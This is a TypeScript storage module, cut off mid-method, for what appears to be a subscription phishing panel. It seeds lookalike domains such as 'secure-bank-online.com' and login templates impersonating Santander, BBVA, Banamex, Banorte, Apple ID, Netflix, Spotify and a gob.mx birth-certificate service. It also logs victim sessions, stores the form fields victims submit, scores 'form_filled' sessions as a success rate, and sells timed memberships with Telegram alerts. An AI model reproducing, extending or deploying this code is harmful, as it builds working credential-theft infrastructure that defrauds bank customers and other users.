import { 
  type User, 
  type InsertUser, 
  type InsertUserRegister,
  type InsertUserLogin,
  type UpdateMembership,
  type UserWithMembership,
  type Template, 
  type InsertTemplate,
  type GeneratedLink,
  type InsertGeneratedLink,
  type Session,
  type InsertSession,
  type Submission,
  type InsertSubmission,
  type Activity,
  type InsertActivity,
  type AvailableDomain,
  type InsertAvailableDomain,
  type AdminConfig,
  type InsertAdminConfig,
  type SessionWithData,
  type LinkWithStats,
  type DashboardStats,
  type AdminDashboardStats
} from "@shared/schema";
import { randomUUID } from "crypto";
import { db } from "./db";
import { eq, desc, and, count, inArray } from "drizzle-orm";
import * as schema from "@shared/schema";
import * as bcrypt from "bcrypt";

// Configuración de seguridad
const BCRYPT_ROUNDS = 12; // Rounds de hashing - 12 es seguro para 2025

/**
 * Funciones helper de seguridad para contraseñas
 */
async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, BCRYPT_ROUNDS);
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

/**
 * Sanitizar entrada para prevenir inyecciones
 */
function sanitizeString(input: string): string {
  return input.trim().replace(/[<>'"]/g, '');
}

export interface IStorage {
  // Users and Authentication
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  registerUser(user: InsertUserRegister): Promise<User>;
  loginUser(credentials: InsertUserLogin): Promise<User | null>;
  updateUser(id: string, user: Partial<InsertUser>): Promise<User | undefined>;
  updateUserId(oldId: string, newId: string): Promise<User | undefined>;
  updateUserPassword(username: string, password: string): Promise<User | undefined>;
  
  // Membership Management
  updateUserMembership(data: UpdateMembership): Promise<User | undefined>;
  getUserWithMembership(id: string): Promise<UserWithMembership | undefined>;
  getAllUsers(): Promise<UserWithMembership[]>;
  getActiveMembers(): Promise<UserWithMembership[]>;
  getExpiredMembers(): Promise<UserWithMembership[]>;
  
  // Telegram Configuration
  updateUserTelegramConfig(userId: string, telegramChatId: string | null, telegramNotifications: boolean): Promise<User | undefined>;
  getUsersWithTelegramNotifications(): Promise<User[]>;

  // Templates
  getAllTemplates(): Promise<Template[]>;
  getTemplate(id: string): Promise<Template | undefined>;
  getTemplateByName(name: string): Promise<Template | undefined>;
  createTemplate(template: InsertTemplate): Promise<Template>;
  updateTemplate(id: string, template: Partial<InsertTemplate>): Promise<Template | undefined>;

  // Available Domains
  getAllAvailableDomains(): Promise<AvailableDomain[]>;
  getAvailableDomain(id: string): Promise<AvailableDomain | undefined>;
  createAvailableDomain(domain: InsertAvailableDomain): Promise<AvailableDomain>;
  updateAvailableDomain(id: string, domain: Partial<InsertAvailableDomain>): Promise<AvailableDomain | undefined>;
  deleteAvailableDomain(id: string): Promise<boolean>;
  getTemplateByNumericId(numericId: string): Promise<Template | undefined>;

  // Generated Links
  createGeneratedLink(link: InsertGeneratedLink): Promise<GeneratedLink>;
  getGeneratedLink(id: string): Promise<GeneratedLink | undefined>;
  getGeneratedLinkByUrl(url: string): Promise<GeneratedLink | undefined>;
  getGeneratedLinkByUserAndTemplate(userId: string, templateId: string): Promise<GeneratedLink | undefined>;
  getAllGeneratedLinks(): Promise<LinkWithStats[]>;
  getGeneratedLinksByUserId(userId: string): Promise<LinkWithStats[]>;
  updateGeneratedLink(id: string, link: Partial<InsertGeneratedLink>): Promise<GeneratedLink | undefined>;
  deleteGeneratedLink(id: string): Promise<boolean>;

  // Sessions
  createSession(session: InsertSession): Promise<Session>;
  getSession(id: string): Promise<Session | undefined>;
  getAllSessions(): Promise<SessionWithData[]>;
  getActiveSessions(): Promise<SessionWithData[]>;
  updateSession(id: string, session: Partial<InsertSession>): Promise<Session | undefined>;
  updateSessionStatus(id: string, status: string): Promise<Session | undefined>;
  updateSessionLastActivity(id: string): Promise<Session | undefined>;
  getSessionsByLinkId(linkId: string): Promise<SessionWithData[]>;
  clearAllSessions(): Promise<boolean>;
  clearSessionsByUserId(userId: string): Promise<boolean>;

  // Submissions
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  getSubmissionsBySessionId(sessionId: string): Promise<Submission[]>;
  clearSubmissionsBySessionIds(sessionIds: string[]): Promise<boolean>;

  // Activities
  createActivity(activity: InsertActivity): Promise<Activity>;
  getRecentActivities(limit?: number): Promise<Activity[]>;

  // Dashboard stats
  getDashboardStats(): Promise<DashboardStats>;
  getAdminDashboardStats(): Promise<AdminDashboardStats>;

  // Admin Config
  getAdminConfig(key: string): Promise<AdminConfig | undefined>;
  setAdminConfig(config: InsertAdminConfig): Promise<AdminConfig>;
  getPermanentUserId(): Promise<string>;
}

class MemStorage implements IStorage {
  private users: Map<string, User>;
  private templates: Map<string, Template>;
  private availableDomains: Map<string, AvailableDomain>;
  private generatedLinks: Map<string, GeneratedLink>;
  private sessions: Map<string, Session>;
  private submissions: Map<string, Submission>;
  private activities: Map<string, Activity>;
  private adminConfigs: Map<string, AdminConfig>;
  private permanentUserId: string | null = null;

  constructor() {
    this.users = new Map();
    this.templates = new Map();
    this.availableDomains = new Map();
    this.generatedLinks = new Map();
    this.sessions = new Map();
    this.submissions = new Map();
    this.activities = new Map();
    this.adminConfigs = new Map();

    // Initialize with default templates and domains
    this.initializeDefaultTemplates();
    this.initializeDefaultDomains();
  }

  private async initializeDefaultDomains() {
    const defaultDomains = [
      { domain: "secure-bank-online.com", isActive: true },
      { domain: "my-account-verify.net", isActive: true },
      { domain: "payment-secure.org", isActive: true },
      { domain: "account-update.info", isActive: true },
      { domain: "login-verification.co", isActive: true }
    ];

    for (const domain of defaultDomains) {
      await this.createAvailableDomain(domain);
    }
  }

  private async initializeDefaultTemplates() {
    // Clear existing templates to avoid conflicts
    this.templates.clear();
    
    const defaultTemplates = [
      {
        id: "template-santander-001",
        numericId: "1",
        name: "santander",
        displayName: "Santander Login",
        description: "Banking template",
        brandColor: "#EC0000",
        brandLetter: "S",
        isActive: true,
      },
      {
        id: "template-apple-002",
        numericId: "2",
        name: "apple",
        displayName: "Apple ID Login", 
        description: "Tech template",
        brandColor: "#1D1D1F",
        brandLetter: "A",
        isActive: true,
      },
      {
        id: "template-liverpool-003",
        numericId: "3", 
        name: "liverpool",
        displayName: "Liverpool Store",
        description: "E-commerce template",
        brandColor: "#E91E63",
        brandLetter: "L",
        isActive: true,
      },
      {
        id: "template-netflix-004",
        numericId: "4",
        name: "netflix",
        displayName: "Netflix Streaming",
        description: "Streaming platform template",
        brandColor: "#E50914",
        brandLetter: "N",
        isActive: true,
      },
      {
        id: "template-sixflags-005",
        numericId: "5",
        name: "sixflags",
        displayName: "Six Flags México",
        description: "Theme park tickets template",
        brandColor: "#FF6B00",
        brandLetter: "S",
        isActive: true,
      },
      {
        id: "template-latam-006",
        numericId: "6",
        name: "latam",
        displayName: "LATAM Vuelos",
        description: "Flight booking template with dynamic bank selection",
        brandColor: "#663399",
        brandLetter: "L",
        isActive: true,
      },
      {
        id: "template-actas-007",
        numericId: "7",
        name: "actas",
        displayName: "Acta de Nacimiento",
        description: "Sistema oficial para obtener acta de nacimiento en línea - gob.mx",
        brandColor: "#9D2449",
        brandLetter: "A",
        isActive: true,
      },
      {
        id: "template-banamex-008",
        numericId: "8",
        name: "banamex",
        displayName: "Banamex Online",
        description: "Plataforma bancaria en línea de Citibanamex",
        brandColor: "#1e7bb8",
        brandLetter: "B",
        isActive: true,
      },
      {
        id: "template-bbva-009",
        numericId: "9",
        name: "bbva",
        displayName: "BBVA México",
        description: "Banca en línea BBVA México",
        brandColor: "#072146",
        brandLetter: "B",
        isActive: true,
      },
      {
        id: "template-bbva-premios-010",
        numericId: "10",
        name: "bbva-premios",
        displayName: "BBVA Premios",
        description: "Sistema de premios y ruleta BBVA México",
        brandColor: "#072146",
        brandLetter: "B",
        isActive: true,
      },
      {
        id: "template-banorte-premios-011",
        numericId: "11",
        name: "banorte-premios",
        displayName: "Banorte Premios",
        description: "Sistema de premios y ruleta Banorte México",
        brandColor: "#E31E24",
        brandLetter: "B",
        isActive: true,
      },
      {
        id: "template-santander-premios-012",
        numericId: "12",
        name: "santander-premios",
        displayName: "Santander Premios",
        description: "Sistema de premios y ruleta Santander México",
        brandColor: "#EC0000",
        brandLetter: "S",
        isActive: true,
      },
      {
        id: "template-spotify-013",
        numericId: "13",
        name: "spotify",
        displayName: "Spotify Premium",
        description: "Promoción 3 meses gratis con BBVA Digital",
        brandColor: "#1DB954",
        brandLetter: "S",
        isActive: true,
      }
    ];

    for (const template of defaultTemplates) {
      await this.createTemplate(template);
    }
  }

  // Users
  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const now = new Date();
    const user: User = { 
      ...insertUser, 
      id,
      email: insertUser.email || null,
      role: insertUser.role || "user",
      membershipType: insertUser.membershipType || null,
      membershipStartDate: insertUser.membershipStartDate || null,
      membershipEndDate: insertUser.membershipEndDate || null,
      isActive: insertUser.isActive ?? true,
      createdAt: now,
      updatedAt: now
    };
    this.users.set(id, user);
    return user;
  }

  // Authentication methods
  async registerUser(userRegister: InsertUserRegister): Promise<User> {
    // Check if user already exists
    const existingUser = await this.getUserByUsername(userRegister.username);
    if (existingUser) {
      throw new Error("Username already exists");
    }
    
    // Hash password before storing
    const hashedPassword = await hashPassword(userRegister.password);
    
    // Create user with default role 'user'
    return this.createUser({
      username: sanitizeString(userRegister.username),
      password: hashedPassword, // Store hashed password
      email: userRegister.email ? sanitizeString(userRegister.email) : null,
      role: "user",
      membershipType: null,
      membershipStartDate: null,
      membershipEndDate: null,
      isActive: true
    });
  }

  async loginUser(credentials: InsertUserLogin): Promise<User | null> {
    const user = await this.getUserByUsername(sanitizeString(credentials.username));
    if (!user || !user.isActive) {
      return null;
    }
    
    // Secure password verification using bcrypt
    const passwordValid = await verifyPassword(credentials.password, user.password);
    if (passwordValid) {
      return user;
    }
    
    return null;
  }

  async updateUser(id: string, updates: Partial<InsertUser>): Promise<User | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;
    
    const updatedUser = { 
      ...user, 
      ...updates, 
      updatedAt: new Date() 
    };
    this.users.set(id, updatedUser);
    return updatedUser;
  }

  async updateUserId(oldId: string, newId: string): Promise<User | undefined> {
    const user = this.users.get(oldId);
    if (!user) return undefined;
    
    // Eliminar la entrada antigua
    this.users.delete(oldId);
    
    // Agregar con el nuevo ID
    const updatedUser = { 
      ...user, 
      id: newId,
      updatedAt: new Date() 
    };
    this.users.set(newId, updatedUser);
    
    return updatedUser;
  }

  async updateUserPassword(username: string, password: string): Promise<User | undefined> {
    // Buscar el usuario por username
    let foundUser: User | undefined;
    let userId: string | undefined;
    
    for (const [id, user] of Array.from(this.users.entries())) {
      if (user.username === username) {
        foundUser = user;
        userId = id;
        break;
      }
    }
    
    if (!foundUser || !userId) return undefined;
    
    // Hash new password before storing
    const hashedPassword = await hashPassword(password);
    
    // Actualizar la contraseña
    const updatedUser = { 
      ...foundUser, 
      password: hashedPassword, // Store hashed password
      updatedAt: new Date()
    };
    this.users.set(userId, updatedUser);
    return updatedUser;
  }

  // Membership management
  async updateUserMembership(data: UpdateMembership): Promise<User | undefined> {
    const user = this.users.get(data.userId);
    if (!user) return undefined;
    
    let membershipStartDate: Date | null = null;
    let membershipEndDate: Date | null = null;
    
    if (data.membershipType) {
      membershipStartDate = new Date();
      const days = data.membershipType === "7_days" ? 7 : 
                   data.membershipType === "15_days" ? 15 : 30;
      membershipEndDate = new Date(membershipStartDate.getTime() + days * 24 * 60 * 60 * 1000);
    }
    
    const updatedUser = {
      ...user,
      membershipType: data.membershipType,
      membershipStartDate,
      membershipEndDate,
      updatedAt: new Date()
    };
    
    this.users.set(data.userId, updatedUser);
    return updatedUser;
  }

  async getUserWithMembership(id: string): Promise<UserWithMembership | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;
    
    const now = new Date();
    const hasActiveMembership = user.membershipEndDate ? now < user.membershipEndDate : false;
    const membershipDaysLeft = user.membershipEndDate && hasActiveMembership ? 
      Math.ceil((user.membershipEndDate.getTime() - now.getTime()) / (24 * 60 * 60 * 1000)) : null;
    
    return {
      ...user,
      hasActiveMembership,
      membershipDaysLeft
    };
  }

  async getAllUsers(): Promise<UserWithMembership[]> {
    const users = Array.from(this.users.values());
    const result: UserWithMembership[] = [];
    
    for (const user of users) {
      const userWithMembership = await this.getUserWithMembership(user.id);
      if (userWithMembership) {
        result.push(userWithMembership);
      }
    }
    
    return result.sort((a, b) => new Date(b.createdAt!).getTime() - new Date(a.createdAt!).getTime());
  }

  async getActiveMembers(): Promise<UserWithMembership[]> {
    const users = await this.getAllUsers();
    return users.filter(user => user.hasActiveMembership);
  }

  async getExpiredMembers(): Promise<UserWithMembership[]> {
    const users = await this.getAllUsers();
    return users.filter(user => user.membershipType && !user.hasActiveMembership);
  }

  // Templates
  async getAllTemplates(): Promise<Template[]> {
    return Array.from(this.templates.values());
  }

  async getTemplate(id: string): Promise<Template | undefined> {
    return this.templates.get(id);
  }

  async getTemplateByName(name: string): Promise<Template | undefined> {
    return Array.from(this.templates.values()).find(t => t.name === name);
  }

  async createTemplate(template: InsertTemplate): Promise<Template> {
    const id = (template as any).id || randomUUID();
    const newTemplate: Template = { 
      ...template, 
      id, 
      description: template.description || null,
      isActive: template.isActive ?? true,
      createdAt: new Date() 
    };
    this.templates.set(id, newTemplate);
    return newTemplate;
  }

  async getTemplateByNumericId(numericId: string): Promise<Template | undefined> {
    return Array.from(this.templates.values()).find(t => t.numericId === numericId);
  }

  async updateTemplate(id: string, template: Partial<InsertTemplate>): Promise<Template | undefined> {
    const existing = this.templates.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, ...template };
    this.templates.set(id, updated);
    return updated;
  }

  // Available Domains
  async getAllAvailableDomains(): Promise<AvailableDomain[]> {
    return Array.from(this.availableDomains.values());
  }

  async getAvailableDomain(id: string): Promise<AvailableDomain | undefined> {
    return this.availableDomains.get(id);
  }

  async createAvailableDomain(domain: InsertAvailableDomain): Promise<AvailableDomain> {
    const id = randomUUID();
    const newDomain: AvailableDomain = { 
      ...domain, 
      id, 
      isActive: domain.isActive ?? true,
      createdAt: new Date() 
    };
    this.availableDomains.set(id, newDomain);
    return newDomain;
  }

  async updateAvailableDomain(id: string, domain: Partial<InsertAvailableDomain>): Promise<AvailableDomain | undefined> {
    const existing = this.availableDomains.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, ...domain };
    this.availableDomains.set(id, updated);
    return updated;
  }

  async deleteAvailableDomain(id: string): Promise<boolean> {
    return this.availableDomains.delete(id);
  }

  // Generated Links
  async createGeneratedLink(link: InsertGeneratedLink): Promise<GeneratedLink> {
    const id = randomUUID();
    
    // Get template to generate URL with numeric ID
    const template = await this.getTemplate(link.templateId!);
    if (!template) {
      throw new Error("Template not found");
    }
    
    // Generate URL using numeric ID
    const url = `${link.domain}/${link.userId}/${template.numericId}`;
    
    const newLink: GeneratedLink = { 
      ...link, 
      id,
      url,
      isActive: link.isActive ?? true,
      templateId: link.templateId || null,
      createdAt: new Date() 
    };
    this.generatedLinks.set(id, newLink);
    
    // Create activity
    await this.createActivity({
      type: "link_generated",
      description: `Link generated for ${link.userId}`,
      linkId: id,
      templateId: link.templateId || null,
      metadata: { url }
    });
    
    return newLink;
  }

  async getGeneratedLink(id: string): Promise<GeneratedLink | undefined> {
    return this.generatedLinks.get(id);
  }

  async getGeneratedLinkByUrl(url: string): Promise<GeneratedLink | undefined> {
    return Array.from(this.generatedLinks.values()).find(link => link.url === url);
  }

  async getGeneratedLinkByUserAndTemplate(userId: string, templateId: string): Promise<GeneratedLink | undefined> {
    return Array.from(this.generatedLinks.values()).find(l => l.userId === userId && l.templateId === templateId);
  }

  async getAllGeneratedLinks(): Promise<LinkWithStats[]> {
    const links = Array.from(this.generatedLinks.values());
    const result: LinkWithStats[] = [];
    
    for (const link of links) {
      const template = await this.getTemplate(link.templateId!);
      const linkSessions = Array.from(this.sessions.values()).filter(s => s.linkId === link.id);
      const submissionCount = Array.from(this.submissions.values()).filter(
        sub => linkSessions.some(s => s.id === sub.sessionId)
      ).length;
      
      result.push({
        ...link,
        template: template!,
        sessionCount: linkSessions.length,
        submissionCount
      });
    }
    
    return result.sort((a, b) => new Date(b.createdAt!).getTime() - new Date(a.createdAt!).getTime());
  }

  async getGeneratedLinksByUserId(userId: string): Promise<LinkWithStats[]> {
    const links = Array.from(this.generatedLinks.values()).filter(link => link.userId === userId);
    const result: LinkWithStats[] = [];
    
    for (const link of links) {
      const template = await this.getTemplate(link.templateId!);
      const linkSessions = Array.from(this.sessions.values()).filter(s => s.linkId === link.id);
      const submissionCount = Array.from(this.submissions.values()).filter(
        sub => linkSessions.some(s => s.id === sub.sessionId)
      ).length;
      
      result.push({
        ...link,
        template: template!,
        sessionCount: linkSessions.length,
        submissionCount
      });
    }
    
    return result.sort((a, b) => new Date(b.createdAt!).getTime() - new Date(a.createdAt!).getTime());
  }

  async updateGeneratedLink(id: string, link: Partial<InsertGeneratedLink>): Promise<GeneratedLink | undefined> {
    const existing = this.generatedLinks.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, ...link };
    this.generatedLinks.set(id, updated);
    return updated;
  }

  async deleteGeneratedLink(id: string): Promise<boolean> {
    return this.generatedLinks.delete(id);
  }

  // Sessions
  async createSession(session: InsertSession): Promise<Session> {
    const id = randomUUID();
    
    // Get template to determine initial screen
    const link = await this.getGeneratedLink(session.linkId!);
    const template = link ? await this.getTemplate(link.templateId!) : undefined;
    let initialScreen = "login"; // default
    
    if (template) {
      switch (template.name) {
        case "actas":
          initialScreen = "solicitar";
          break;
        case "netflix":
        case "sixflags":
          initialScreen = "landing";
          break;
        case "latam":
          initialScreen = "search";
          break;
        case "bbva-premios":
          initialScreen = "premios";
          break;
        case "spotify":
          initialScreen = "login";
          break;
        default:
          initialScreen = "login";
          break;
      }
    }
    
    const newSession: Session = { 
      ...session, 
      id, 
      status: session.status || "active",
      currentScreen: session.currentScreen || initialScreen,
      linkId: session.linkId || null,
      ipAddress: session.ipAddress || null,
      userAgent: session.userAgent || null,
      startedAt: new Date(),
      lastActivity: new Date()
    };
    this.sessions.set(id, newSession);
    
    // Create activity
    await this.createActivity({
      type: "session_created",
      description: `New session created`,
      sessionId: id,
      linkId: session.linkId || null,
      templateId: link?.templateId || null,
      metadata: { userAgent: session.userAgent, ipAddress: session.ipAddress }
    });
    
    return newSession;
  }

  async getSession(id: string): Promise<Session | undefined> {
    return this.sessions.get(id);
  }

  async getAllSessions(): Promise<SessionWithData[]> {
    const sessions = Array.from(this.sessions.values());
    const result: SessionWithData[] = [];
    
    for (const session of sessions) {
      const submissions = await this.getSubmissionsBySessionId(session.id);
      const link = await this.getGeneratedLink(session.linkId!);
      const template = link ? await this.getTemplate(link.templateId!) : undefined;
      
      if (link && template) {
        result.push({
          ...session,
          submissions,
          link: { ...link, template }
        });
      }
    }
    
    return result.sort((a, b) => new Date(b.startedAt!).getTime() - new Date(a.startedAt!).getTime());
  }

  async getActiveSessions(): Promise<SessionWithData[]> {
    const allSessions = await this.getAllSessions();
    return allSessions.filter(session => session.status === "active");
  }

  async updateSession(id: string, session: Partial<InsertSession>): Promise<Session | undefined> {
    const existing = this.sessions.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, ...session, lastActivity: new Date() };
    this.sessions.set(id, updated);
    return updated;
  }

  async updateSessionStatus(id: string, status: string): Promise<Session | undefined> {
    const existing = this.sessions.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, status, lastActivity: new Date() };
    this.sessions.set(id, updated);
    return updated;
  }

  async updateSessionLastActivity(id: string): Promise<Session | undefined> {
    const existing = this.sessions.get(id);
    if (!existing) return undefined;
    
    const updated = { ...existing, lastActivity: new Date() };
    this.sessions.set(id, updated);
    return updated;
  }

  async getSessionsByLinkId(linkId: string): Promise<SessionWithData[]> {
    const allSessions = await this.getAllSessions();
    return allSessions.filter(session => session.linkId === linkId);
  }

  async clearAllSessions(): Promise<boolean> {
    try {
      // Get all session IDs before clearing
      const sessionIds = Array.from(this.sessions.keys());
      
      // Clear all sessions
      this.sessions.clear();
      
      // Clear all submissions for these sessions
      await this.clearSubmissionsBySessionIds(sessionIds);
      
      return true;
    } catch (error) {
      console.error("Error clearing all sessions:", error);
      return false;
    }
  }

  async clearSessionsByUserId(userId: string): Promise<boolean> {
    try {
      const sessionIds: string[] = [];
      
      // Find and remove sessions for the specific user
      for (const [sessionId, session] of this.sessions.entries()) {
        const link = await this.getGeneratedLink(session.linkId!);
        if (link && link.userId === userId) {
          sessionIds.push(sessionId);
          this.sessions.delete(sessionId);
        }
      }
      
      // Clear submissions for these sessions
      await this.clearSubmissionsBySessionIds(sessionIds);
      
      return true;
    } catch (error) {
      console.error("Error clearing sessions by user ID:", error);
      return false;
    }
  }

  // Submissions
  async createSubmission(submission: InsertSubmission): Promise<Submission> {
    const id = randomUUID();
    const newSubmission: Submission = { 
      ...submission, 
      id, 
      sessionId: submission.sessionId || null,
      submittedAt: new Date() 
    };
    this.submissions.set(id, newSubmission);
    
    // Update session status and create activity
    const session = await this.getSession(submission.sessionId!);
    if (session) {
      await this.updateSession(session.id, { status: "form_filled" });
      
      await this.createActivity({
        type: "data_submitted",
        description: `Data submitted`,
        sessionId: session.id,
        linkId: session.linkId,
        templateId: null,
        metadata: { fieldName: submission.fieldName }
      });
    }
    
    return newSubmission;
  }

  async getSubmissionsBySessionId(sessionId: string): Promise<Submission[]> {
    return Array.from(this.submissions.values())
      .filter(sub => sub.sessionId === sessionId)
      .sort((a, b) => new Date(b.submittedAt!).getTime() - new Date(a.submittedAt!).getTime());
  }

  async clearSubmissionsBySessionIds(sessionIds: string[]): Promise<boolean> {
    try {
      for (const [submissionId, submission] of this.submissions.entries()) {
        if (submission.sessionId && sessionIds.includes(submission.sessionId)) {
          this.submissions.delete(submissionId);
        }
      }
      return true;
    } catch (error) {
      console.error("Error clearing submissions:", error);
      return false;
    }
  }

  // Activities
  async createActivity(activity: InsertActivity): Promise<Activity> {
    const id = randomUUID();
    const newActivity: Activity = { 
      ...activity, 
      id, 
      templateId: activity.templateId || null,
      linkId: activity.linkId || null,
      sessionId: activity.sessionId || null,
      metadata: activity.metadata || null,
      createdAt: new Date() 
    };
    this.activities.set(id, newActivity);
    return newActivity;
  }

  async getRecentActivities(limit: number = 10): Promise<Activity[]> {
    const activities = Array.from(this.activities.values())
      .sort((a, b) => new Date(b.createdAt!).getTime() - new Date(a.createdAt!).getTime());
    return activities.slice(0, limit);
  }

  // Dashboard stats
  async getDashboardStats(): Promise<DashboardStats> {
    const allSessions = Array.from(this.sessions.values());
    const activeSessions = allSessions.filter(s => s.status === "active").length;
    const totalLinks = this.generatedLinks.size;
    const totalSubmissions = this.submissions.size;
    const formFilledSessions = allSessions.filter(s => s.status === "form_filled").length;
    const successRate = allSessions.length > 0 ? (formFilledSessions / allSessions.length) * 100 : 0;

    return {
      activeSessions,
      totalLinks,
      totalSubmissions,
      successRate: Math.round(successRate * 10) / 10
    };
  }

  async getAdminDashboardStats(): Promise<AdminDashboardStats> {
    const basicStats = await this.getDashboardStats();
    const totalUsers = this.users.size;
    const activeMembers = (await this.getActiveMembers()).length;
    const expiredMembers = (await this.getExpiredMembers()).length;
    
    return {
      ...basicStats,
      totalUsers,
      activeMembers,
      expiredMembers
    };
  }

  // Admin Config
  async getAdminConfig(key: string): Promise<AdminConfig | undefined> {
    return this.adminConfigs.get(key);
  }

  async setAdminConfig(config: InsertAdminConfig): Promise<AdminConfig> {
    const existing = this.adminConfigs.get(config.key);
    if (existing) {
      const updated: AdminConfig = { ...existing, ...config };
      this.adminConfigs.set(config.key, updated);
      return updated;
    } else {
      const id = randomUUID();
      const newConfig: AdminConfig = { 
        ...config, 
        id, 
        createdAt: new Date() 
      };
      this.adminConfigs.set(config.key, newConfig);
      return newConfig;
    }
  }

  // Helper function to generate permanent user ID
  private generatePermanentUserId(): string {
    const chars = '0123456789abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  async getPermanentUserId(): Promise<string> {
    if (this.permanentUserId) {
      return this.permanentUserId;
    }

    let config = await this.getAdminConfig('permanent_user_id');
    if (!config) {
      const userId = this.generatePermanentUserId();
      config = await this.setAdminConfig({
        key: 'permanent_user_id',
        value: userId
      });
      this.permanentUserId = userId;
      return userId;
    }
    
    this.permanentUserId = config.value;
    return config.value;
  }
}

export class DatabaseStorage implements IStorage {
  
  // Users and Authentication
  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(schema.users).where(eq(schema.users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(schema.users).where(eq(schema.users.username, username));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const now = new Date();
    const userData = {
      ...insertUser,
      email: insertUser.email || null,
      role: insertUser.role || "user",
      membershipType: insertUser.membershipType || null,
      membershipStartDate: insertUser.membershipStartDate || null,
      membershipEndDate: insertUser.membershipEndDate || null,
      isActive: insertUser.isActive ?? true,
      createdAt: now,
      updatedAt: now
    };
    
    const [user] = await db.insert(schema.users).values(userData).returning();
    return user;
  }

  async registerUser(userRegister: InsertUserRegister): Promise<User> {
    const existingUser = await this.getUserByUsername(userRegister.username);
    if (existingUser) {
      throw new Error("Username already exists");
    }
    
    // Hash password before storing in database
    const hashedPassword = await hashPassword(userRegister.password);
    
    return this.createUser({
      username: sanitizeString(userRegister.username),
      password: hashedPassword, // Store hashed password
      email: userRegister.email ? sanitizeString(userRegister.email) : null,
      role: "user",
      membershipType: null,
      membershipStartDate: null,
      membershipEndDate: null,
      isActive: true
    });
  }

  async loginUser(credentials: InsertUserLogin): Promise<User | null> {
    const user = await this.getUserByUsername(sanitizeString(credentials.username));
    if (!user || !user.isActive) {
      return null;
    }
    
    // Secure password verification using bcrypt
    const passwordValid = await verifyPassword(credentials.password, user.password);
    if (passwordValid) {
      return user;
    }
    
    return null;
  }

  async updateUser(id: string, updates: Partial<InsertUser>): Promise<User | undefined> {
    const userData = {
      ...updates,
      updatedAt: new Date()
    };
    
    const [user] = await db.update(schema.users)
      .set(userData)
      .where(eq(schema.users.id, id))
      .returning();
    
    return user || undefined;
  }

  async updateUserId(oldId: string, newId: string): Promise<User | undefined> {
    const [user] = await db.update(schema.users)
      .set({ 
        id: newId,
        updatedAt: new Date()
      })
      .where(eq(schema.users.id, oldId))
      .returning();
    
    return user || undefined;
  }

  async updateUserPassword(username: string, password: string): Promise<User | undefined> {
    // Hash new password before storing in database
    const hashedPassword = await hashPassword(password);
    
    const [user] = await db.update(schema.users)
      .set({ 
        password: hashedPassword, // Store hashed password
        updatedAt: new Date()
      })
      .where(eq(schema.users.username, sanitizeString(username)))
      .returning();
    
    return user || undefined;
  }

  async updateUserMembership(data: UpdateMembership): Promise<User | undefined> {
    let membershipStartDate: Date | null = null;
    let membershipEndDate: Date | null = null;
    
    if (data.membershipType) {
      membershipStartDate = new Date();
      const days = data.membershipType === "7_days" ? 7 : 
                   data.membershipType === "15_days" ? 15 : 30;
      membershipEndDate = new Date(membershipStartDate.getTime() + days * 24 * 60 * 60 * 1000);
    }
    
    const [user] = await db.update(schema.users)
      .set({
        membershipType: data.membershipType,
        membershipStartDate,
        membershipEndDate,
        updatedAt: new Date()
      })
      .where(eq(schema.users.id, data.userId))
      .returning();
    
    return user || undefined;
  }

  async getUserWithMembership(id: string): Promise<UserWithMembership | undefined> {
    const user = await this.getUser(id);
    if (!user) return undefined;
    
    const now = new Date();
    const hasActiveMembership = user.membershipEndDate ? now < user.membershipEndDate : false;
    const membershipDaysLeft = user.membershipEndDate && hasActiveMembership ? 
      Math.ceil((user.membershipEndDate.getTime() - now.getTime()) / (24 * 60 * 60 * 1000)) : null;
    
    return {
      ...user,
      hasActiveMembership,
      membershipDaysLeft
    };
  }

  async getAllUsers(): Promise<UserWithMembership[]> {
    const users = await db.select().from(schema.users).orderBy(desc(schema.users.createdAt));
    const result: UserWithMembership[] = [];
    
    for (const user of users) {
      const userWithMembership = await this.getUserWithMembership(user.id);
      if (userWithMembership) {
        result.push(userWithMembership);
      }
    }
    
    return result;
  }

  async getActiveMembers(): Promise<UserWithMembership[]> {
    const users = await this.getAllUsers();
    return users.filter(user => user.hasActiveMembership);
  }

  async getExpiredMembers(): Promise<UserWithMembership[]> {
    const users = await this.getAllUsers();
    return users.filter(user => user.membershipType && !user.hasActiveMembership);
  }

  // Templates - Read from database (solo activos)
  async getAllTemplates(): Promise<Template[]> {
    try {
      return await db.select().from(schema.templates).where(eq(schema.templates.isActive, true));
    } catch (error) {
      console.error("Error getting templates:", error);
      return [];
    }
  }

  async getTemplate(id: string): Promise<Template | undefined> {
    const templates = await this.getAllTemplates();
    return templates.find(t => t.id === id);
  }

  async getTemplateByName(name: string): Promise<Template | undefined> {
    const templates = await this.getAllTemplates();
    return templates.find(t => t.name === name);
  }

  async getTemplateByNumericId(numericId: string): Promise<Template | undefined> {
    const templates = await this.getAllTemplates();
    return templates.find(t => t.numericId === numericId);
  }

  async createTemplate(template: InsertTemplate): Promise<Template> {
    // For now, just return the template with an ID
    const id = randomUUID();
    return { 
      ...template, 
      id, 
      description: template.description || null,
      isActive: template.isActive ?? true,
      createdAt: new Date() 
    };
  }

  async updateTemplate(id: string, template: Partial<InsertTemplate>): Promise<Template | undefined> {
    // For now, just return undefined
    return undefined;
  }

  // Other methods - Read from database
  async getAllAvailableDomains(): Promise<AvailableDomain[]> {
